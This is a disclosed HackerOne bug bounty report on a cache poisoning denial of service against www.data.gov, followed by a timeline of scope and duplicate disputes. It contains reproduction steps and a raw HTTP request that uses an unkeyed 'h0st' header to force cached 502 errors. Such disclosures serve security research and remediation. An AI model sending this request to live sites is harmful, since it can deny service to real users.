---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "duplicate"
weakness: null
enriched: true
body: true
date: 2021-06-15
submitted: 2020-07-25T19:00:13.932Z
bounty_usd: null
votes: 12
cve: []
program: "[[programs/gsa_bbp|GSA Bounty]]"
reporter: "kq8dq"
source: "https://hackerone.com/reports/942629"
title: "Denial of service via cache poisoning on https://www.data.gov/"
---
# Denial of service via cache poisoning on https://www.data.gov/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 12 | **Program:** GSA Bounty | **Disclosed:** 2021-06-15

- Report: [https://hackerone.com/reports/942629](https://hackerone.com/reports/942629)
- CWE: N/A
- Submitted: 2020-07-25T19:00:13.932Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

An attacker can persistently block access to any on https://www.data.gov/ by using cache poisoning with the h0st headers to cause
502 response code。

To replicate:
load https://www.data.gov/ in your browser.
look the burp ,  add ?xyzxyz=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.
load https://www.data.gov/?xyzxyz=1 in your browser. again.
and you win see 502 ERROR

{F922984}

To be more clearer, see my video
{F922983}

my http request：

```
GET /?xyzxyz=1 HTTP/1.1
Host: www.data.gov
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
h0st: wrtqvavjigwdvoqk
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```


For more information on the theory behind this attack, check out https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

Similar report：
https://hackerone.com/reports/622122
https://hackerone.com/reports/409370

## Impact

An attacker can persistently block access to any on https://www.data.gov/

## Timeline

- **Report Filed**
- **2020-07-26** @nochnoidozor: Hi @kq8dq,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Not Applicable**
- **2020-07-26** @kq8dq: Most bug-bounty policies have text discouraging DoS attacks. However, if you look closely you'll see some of them actually forbid launching DoS attacks, rather than forbidding reporting DoS vulnerabilities. Web cache poisoning has a rare property in that it's often possible to make a proof of concept without actually launching an attack, provided you use a cache-buster.
- **2020-07-26** @kq8dq: https://hackerone.com/paypal
you can see  Policy Page: 
Denial of service (DOS) attacks using automated tools

but it accept this report 
https://hackerone.com/reports/622122
- **2020-07-26** @kq8dq: ok, i check TTS Bug Bounty puclic report 。
i find this report.
https://hackerone.com/reports/728664.
{F924215}
{F924216}

so TTS Bug Bounty team accept this type report。

@nathand he say:
it was my interpretation that traditional volume DoS was not in scope, as the VD policy specifically calls out "Network denial of service":

https://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md

The exploit here does not require a high volume of requests - in fact, just one well timed request would be enough to poison the homepage of the assets I listed for a period of time (and ensuing single requests to keep it poisoned when the cache is aged off, about 30 seconds or so apart from what I can tell).

I understand DoS is normally listed as out of scope, but that appears to be to prevent testers from sending excess traffic - this does not require excess traffic and is possible to test without disrupting real requests at all (using cache busters). Is there a way we could get TTS to weigh in on whether they believe cache poisoning is in scope?





Best Regards,
- **2020-07-27** @kq8dq: any update
- **2020-07-27** @kq8dq: see this https://hackerone.com/reports/728664

same type bugs, same TTS Bug Bounty
- **2020-07-27** @kq8dq: any update
- **Report Reopened**
- **Report Duplicate**
- **2020-07-28** @kq8dq: hi ,  #930484 is Submited by my another account @ddzih6。 that domain is ```catalog.data.gov```.
and that cookie is cache key, i am a newer, and I ran out of four submission opportunities 。
{F927386}
So I created a new account @kq8dq。i find ```www.data.gov``` also has same bug, but the cookie is not cache key , and in this report , the domain is ```www.data.gov```。 

so no Duplicate (#930484).
#930484 report domain is ```catalog.data.gov```., this is ```www.data.gov```。
```catalog.data.gov``` cookie is cache key, ```www.data.gov``` cookie  is not cache key。

Please open the report to the tts team。

you can see tts also accept Cache poisoning DoS in report  #728664
{F927387}
- **2020-07-28** @kq8dq: catalog.data.gov and www.data.gov no same domain。
{F927410}
- **2020-07-30** @kq8dq: any updata?
- **2020-07-30** @kq8dq: any updata?
- **2020-07-30** @kq8dq: 930484 report domain is catalog.data.gov., this is www.data.gov , so no Duplicate
- **2020-08-01** @nochnoidozor: Hi @kq8dq - The team is evaluating the submission in order to determine how to proceed. Meanwhile could you confirm if the cookie is also used with `www.data.gov` as part of the cache-key?

Best,
@nochnoidozor
- **2020-08-05** @kq8dq: hi,  the cookie is not used with www.data.gov as part of the cache-key。
- **2020-08-05** @kq8dq: more clearer, see my video。

{F936667}
- **2020-08-05** @kq8dq: Very simple method of reproduction

load https://www.data.gov/ in your browser.
look the burp , add ?jghjgy=1 as cache buster , and add h0st headers h0st: wrtqvavjigwdvoqk in your burp.
load https://www.data.gov/?jghjgy=1 in your browser. again.
and you win see 502 ERROR

{F936684}
- **2020-08-06** @kq8dq: anyupdata?
- **2020-08-06** @kq8dq: anyupdata?
- **2020-08-09** @kq8dq: anyupdata?
- **Agreed On Going Public**
- **2020-08-09** @kq8dq: I want to know why the same type of vulnerability, the same program, my report just fails
- **2020-08-09** @nochnoidozor: Hi @kq8dq - The submission is still under review by the team, as you know, as soon as there are updates you will get notified.

Best,
@nochnoidozor
- **Agreed On Going Public**
- **Report Became Public**
